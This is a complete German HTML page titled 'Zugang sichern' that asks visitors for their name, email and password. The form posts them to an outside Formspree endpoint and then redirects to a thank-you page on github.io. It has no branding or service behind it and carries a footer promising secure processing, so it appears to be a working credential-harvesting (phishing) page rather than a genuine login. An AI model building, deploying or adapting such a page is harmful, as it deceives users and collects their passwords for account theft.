<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Zugang sichern</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #fefcea, #f1da36);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      padding: 2rem;
      border-radius: 1.5rem;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
      width: 90%;
      max-width: 420px;
      text-align: center;
    }

    h1 {
      color: #ffc400;
      font-size: 2rem;
      margin-bottom: 1rem;
    }

    input {
      width: 100%;
      padding: 0.9rem;
      margin-top: 1rem;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 10px;
      transition: 0.3s;
    }

    input:focus {
      border-color: #ffc400;
      outline: none;
      box-shadow: 0 0 5px rgba(255, 196, 0, 0.5);
    }

    button {
      margin-top: 1.5rem;
      padding: 0.9rem 1.5rem;
      background-color: #ffc400;
      border: none;
      font-weight: bold;
      font-size: 1rem;
      color: #222;
      cursor: pointer;
      border-radius: 10px;
      transition: 0.2s;
      width: 100%;
    }

    button:hover {
      background-color: #e0ae00;
    }

    .footer-text {
      margin-top: 1.5rem;
      font-size: 0.95rem;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîê Zugang sichern</h1>
    <form action="https://formspree.io/f/xyzwyzzg" method="POST">
      <input type="text" name="name" placeholder="Dein Name" required />
      <input type="email" name="email" placeholder="Deine E-Mail" required />
      <input type="password" name="password" placeholder="Passwort eingeben" required />
      <label style="display: block; margin-top: 0.5rem; font-size: 0.95rem;">
        <input type="checkbox" onclick="togglePassword()"> Passwort anzeigen
      </label>
      <input type="hidden" name="_redirect" value="https://kopfab112233.github.io/pages/danke.html">
      <button type="submit">Absenden</button>
    </form>
    <div class="footer-text">üîí Deine Eingaben werden sicher verarbeitet.</div>
  </div>
<script>
  function togglePassword() {
    const passwordInput = document.querySelector('input[name="password"]');
    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
  }
</script>
</body>
</html>
